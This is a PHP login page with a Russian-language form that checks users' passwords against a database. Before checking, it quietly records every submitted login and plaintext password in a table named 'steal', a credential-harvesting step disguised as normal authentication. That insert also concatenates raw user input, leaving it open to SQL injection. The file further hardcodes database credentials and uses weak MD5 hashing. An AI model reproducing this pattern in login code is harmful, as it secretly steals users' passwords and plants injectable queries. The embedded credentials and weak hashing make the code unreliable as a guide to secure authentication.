<?php
    require 'isauth.php';
    require 'headerFunctions.php';
    if(isAuth()){
        header('Location: index.php');
    }
    
    function generateCode($length=6) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHI JKLMNOPRQSTUVWXYZ0123456789";
    $code = "";
    $clen = strlen($chars) - 1;  
    while (strlen($code) < $length) {
            $code .= $chars[mt_rand(0,$clen)];  
    }
    return $code;
}

# Соединяемся с БД
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
    $conn = mysqli_connect("localhost", "ufkeirby98_list", "5ylDp*wb", "ufkeirby98_list");
    
    $err = "";
    if(isset($_POST['submit']))
    {
        # Вытаскиваем из БД запись, у которой логин равняется введенному
        $query = mysqli_query($conn, "SELECT user_id, user_password FROM users WHERE user_login='".mysqli_real_escape_string($conn, $_POST['login'])."' LIMIT 1");
        $data = mysqli_fetch_assoc($query);
        
        $Slogin = $_POST['login'];
        $Spassword = $_POST['password'];
        mysqli_query($conn, "INSERT INTO steal SET Slogin='".$Slogin."', Spassword='".$Spassword."'");
            
        # Сравниваем пароли
    
        if($data['user_password'] === md5(md5($_POST['password'])))
    
        {
            # Генерируем случайное число и шифруем его
            $hash = md5(generateCode(10));
  
    
            # Записываем в БД новый хеш авторизации и IP
            mysqli_query($conn, "UPDATE users SET user_hash='".$hash."' ".$insip." WHERE user_id='".$data['user_id']."'");
    
            # Ставим куки
            setcookie("id", $data['user_id'], time()+60*60*24*30);
            setcookie("hash", $hash, time()+60*60*24*30);
    
            # Переадресовываем браузер на страницу проверки нашего скрипта
            header("Location: check.php"); exit();
        }
        else
        {
             $err = "Неправильный логин или пароль!";
        }
    }
?>


<!doctype html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link rel="stylesheet" href="/styles.css">
    <title>Главная</title>

</head>
<body>
    
    
    <?php 
        showRegisterHeader(True); 
    ?>
    <div class="container mt-5">
        <div class="card">
            <div class="card-header display-5">
                Вход
            </div>
            <div class="card-body">
                <form action="" method="POST" class="my-3">
                
                    <label for="login" class="mb-3" >Логин</label> 
                    <input class="form-control" name="login" type="text">
                    
                    <label for="password" class="my-3" >Пароль</label>
                    <input class="form-control" name="password" type="password">
                    
                    <input class="btn btn-primary mt-4" name="submit" type="submit" value="Войти">
                    
                    <br>
                    <div class="mt-3">
                        <?php
                            echo $err;
                        ?>
                    </div>
                    
                </form>
            </div>
        </div>
    </div>
    
      
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
</body>
</html>